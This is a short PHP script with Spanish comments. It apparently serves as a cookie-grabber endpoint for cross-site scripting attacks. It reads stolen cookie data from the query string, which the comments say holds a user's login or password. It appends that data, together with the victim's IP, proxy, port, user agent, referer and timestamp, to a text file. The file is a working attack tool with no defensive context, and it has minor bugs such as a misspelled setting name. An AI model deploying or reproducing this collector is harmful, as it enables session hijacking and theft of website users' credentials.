<?php 
//Obtenemos la Ip mediante la consulta a la cabecera.
//muestra la IP REMOTE_ADDR

function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "desconocido")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "desconocido")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "desconocido")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "desconocido")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "desconocido"; 
	return($ip); 
} 



function logData() 
{ 
	$ipLog="datos.txt"; //En el archivo en el que guarda...!!
	$cookie = $_SERVER['QUERY_STRING']; //Cokiee en el se encunetra el user o la contraseña.
	$register_globals = (bool) ini_get('register_gobals'); 
	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
	else $ip = GetIP(); 
	
	$lenguaje_xd = $_SERVER['HTTP_ACCEPT_LANGUAGE']; //El lenguaje 
	$procolo_xd = $_SERVER['SERVER_PROTOCOL']; //Protocolo por el cual se navega
	$proxy_xd = $_SERVER['HTTP_X_FORWARDED_FOR']; //el proxy
	$rem_port = $_SERVER['REMOTE_PORT']; //Optenemos el puerto
	$user_agent = $_SERVER['HTTP_USER_AGENT']; //Optenemos el agente por el cual se hace la navegacion con esto podemos saber si es mediante wap o web y algunas cosillas mas
	$rqst_method = $_SERVER['METHOD']; //Metodo por el cual se realizo Get / Post
	$rem_host = $_SERVER['REMOTE_HOST']; //Obtenemos el host
	$referer = $_SERVER['HTTP_REFERER']; //La pagina a la cual ingreso
	$date=date ("l dS of F Y h:i:s A");  //Fecha en que ingreso 2012 03:05:34 AM
	$log=fopen("$ipLog", "a+"); 

	if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) 
		fputs($log, "IP: $ip | Proxy:$proxy_xd | PORT: $rem_port | Protocolo: $procolo_xd | Host: $rem_host | Lenguaje: $lenguaje_xd | Agente: $user_agent | Metodo get/post: $rqst_method | REF: $referer | Fecha{ : } $date | COOKIE:  $cookie <br>"); 
	else 
		fputs($log, "IP: $ip | Proxy:$proxy_xd | PORT: $rem_port | Protocolo: $procolo_xd | Host: $rem_host | Lenguaje: $lenguaje_xd | Agente: $user_agent | Metodo get/post: $rqst_method | REF: $referer |  Fecha: $date | COOKIE:  $cookie \n\n"); 
	fclose($log); 
} 

logData(); 

?>